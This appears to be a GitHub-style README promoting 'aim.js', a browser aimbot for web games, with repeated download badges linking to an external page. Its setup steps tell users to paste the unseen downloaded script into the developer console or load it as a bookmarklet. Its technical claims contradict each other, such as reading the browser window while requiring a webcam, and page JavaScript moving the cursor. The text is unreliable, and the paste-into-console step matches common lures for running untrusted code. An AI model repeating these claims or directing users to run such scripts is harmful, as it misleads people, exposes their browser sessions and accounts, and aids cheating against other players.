# aim.js - Browser-Based Object Detection & Cursor Helper 2026

> **A compact JavaScript utility that applies object detection to help position the cursor directly in the browser.** Built for web environments where visual targeting automation is useful.

[![Game Script](https://img.shields.io/badge/Type-Object%20Detection-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Browser-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/alexmoore22/aim-js-object-executor?style=flat-square)](https://github.com/alexmoore22/aim-js-object-executor)

---

<p align="center">
  <a href="https://alexmoore22.github.io/aim-js-object-executor/">
    <img src="https://img.shields.io/badge/Download-aim.js%20Script-brightgreen?style=for-the-badge" alt="Download aim.js Script">
  </a>
</p>

> **[Download aim.js](https://alexmoore22.github.io/aim-js-object-executor/)**

---

[Download Latest Build](https://alexmoore22.github.io/aim-js-object-executor/)

---

## What It Does

aim.js is a browser-side utility that uses object detection algorithms to place the cursor over recognized targets automatically. It is implemented fully in JavaScript, so it runs inside a web page and does not need separate software or a complicated install flow. The script reads visual information from the browser window and shifts the cursor toward detected objects, which makes it a fit for web games and other apps that rely on tracking on-screen items.

This release emphasizes dependable detection with low resource overhead. Once the model has loaded for the first time, the script can continue operating offline, helping keep behavior stable even when connectivity changes. It is intended to be platform-neutral and works across Windows, macOS, and Linux so long as a current browser is available.

---

## Key Capabilities

- **Automatic cursor targeting** - Moves the cursor to detected objects based on the visual feed
- **Runs inside the browser** - No extra desktop application is needed
- **Offline after model load** - Keeps working without an internet connection once the detection model is ready
- **Works across platforms** - Suitable for Windows, macOS, and Linux
- **Straightforward setup** - Load the script and adjust a few options, with no complex install process
- **Pure JavaScript** - Small, readable, and easy to adapt for custom workflows
- **Flexible input hardware** - Compatible with standard webcams and built-in cameras

---

## Getting Started

1. Download the latest `aim.js` script from the link above.
2. Open your target web page or game in a modern browser (Chrome, Firefox, Edge, or Brave recommended).
3. Open the browser's developer console (F12 or Ctrl+Shift+I).
4. Copy and paste the entire script into the console, then press Enter.
5. The script will initialize and begin detecting objects. Adjust settings as needed.

Alternatively, you can load the script via a bookmarklet for easier repeated use. Create a new bookmark with the script's code as the URL.

---

## Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `detectionThreshold` | 0.6 | Minimum confidence level for object detection (0.0 to 1.0) |
| `cursorSpeed` | 1.0 | Multiplier for cursor movement speed |
| `autoAim` | true | Enable or disable automatic cursor positioning |
| `targetFilter` | "all" | Restrict detection to specific object classes |
| `smoothing` | 0.3 | Smoothing factor for cursor movement (0 = instant, 1 = very smooth) |

Configuration can be modified by editing the `config` object at the top of the script file before loading.

---

## Supported Environments

- **Browsers:** Chrome 90+, Firefox 90+, Edge 90+, Brave 1.30+
- **Operating Systems:** Windows 10/11, macOS 10.15+, Linux (any modern distribution)
- **Hardware:** Standard webcam or integrated camera required for video input
- **Known Limitations:** Performance may vary based on system resources and camera quality. Object detection accuracy depends on lighting conditions and background complexity. Not tested on mobile browsers or tablets.

---

## FAQ

**How do I install aim.js?**  
Download the script and load it into your browser's developer console, or use a bookmarklet for quick access.

**Will the script update automatically?**  
No, you must manually download new versions from the repository to receive updates and improvements.

**Can I customize which objects are detected?**  
Yes, the `targetFilter` option in the configuration allows you to restrict detection to specific object classes.

**Does this work on all websites?**  
It works on any website that runs in a supported browser, but performance and accuracy depend on the page's visual content and your camera setup.

**Where is the detection data stored?**  
All processing happens locally in your browser. No data is sent to external servers.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
